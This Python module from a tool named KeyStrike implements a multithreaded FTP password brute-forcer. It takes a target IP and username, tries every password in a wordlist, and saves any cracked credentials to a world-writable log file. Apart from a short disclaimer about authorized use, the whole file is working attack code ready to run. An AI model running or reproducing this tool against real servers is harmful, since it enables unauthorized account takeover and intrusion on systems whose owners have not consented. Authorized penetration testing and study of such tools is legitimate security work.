"""
DISCLAIMER:
This tool is intended **strictly for educational and authorized testing purposes only**.
You must obtain **explicit permission** from the owner of any system you target with this script.
Unauthorized access or misuse of this tool **may be illegal** and can result in **criminal charges**.

The developer and contributors of KeyStrike **are not responsible** for any misuse or damage caused.
Use responsibly and ethically.
"""
import ftplib
import threading
import os
from utils.colors import color_text
from tqdm import tqdm
from queue import Queue

MAX_THREADS = 10
success_found = False
lock = threading.Lock()
q = Queue()

def attempt_login(target_ip, username):
    global success_found
    while not q.empty() and not success_found:
        password = q.get()
        try:
            with ftplib.FTP() as ftp:
                ftp.connect(target_ip, 21, timeout=5)
                ftp.login(user=username, passwd=password)
                with lock:
                    if not success_found:
                        success_found = True
                        print(color_text(f"\n[SUCCESS] Password found: {password}", "green"))

                       
                        if not os.path.exists("success_log.txt"):
                            with open("success_log.txt", "w") as temp:
                                pass
                            os.chmod("success_log.txt", 0o666)

                        with open("success_log.txt", "w") as log_file:
                            log_file.write(f"Target: {target_ip}\nUsername: {username}\nPassword: {password}\n")
        except:
            pass
        finally:
            q.task_done()

def run():
    global success_found
    print(color_text("[+] Starting Multithreaded FTP Brute Force...\n", "cyan"))

    target_ip = input("Enter FTP server IP address: ")
    username = input("Enter username to test: ")

    try:
        with open("wordlist.txt", "r", encoding="utf-8", errors="ignore") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(color_text("[-] wordlist.txt not found.", "red"))
        return
    except PermissionError:
        print(color_text("[-] wordlist.txt is not writable or accessible.", "red"))
        return

    for pw in passwords:
        q.put(pw)

    pbar = tqdm(total=q.qsize(), desc="Brute Forcing", ncols=100)

    def progress_updater():
        while not q.empty() and not success_found:
            pbar.update(1)

    threading.Thread(target=progress_updater, daemon=True).start()

    threads = []
    for _ in range(MAX_THREADS):
        t = threading.Thread(target=attempt_login, args=(target_ip, username))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    pbar.close()

    if not success_found:
        print(color_text("\n[-] Password not found in wordlist.", "red"))
